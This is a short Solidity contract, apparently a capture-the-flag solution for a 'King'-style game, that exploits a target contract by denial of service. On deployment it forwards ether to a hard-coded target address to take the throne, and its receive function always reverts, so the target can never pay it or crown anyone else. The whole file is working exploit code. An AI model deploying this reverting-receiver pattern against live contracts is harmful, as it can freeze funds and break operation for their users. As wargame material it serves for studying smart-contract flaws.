//by reverting any calls sent to this contract, denies King contract from executing code

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract HackKing {

    address payable public target = 0x4a17E1dE47eE088445A40B33D8f430DaAA977012;

    constructor() public payable{
        target.call{value:msg.value}("");
    }
    

    receive() external payable{
        revert('game over');
    }
    
}
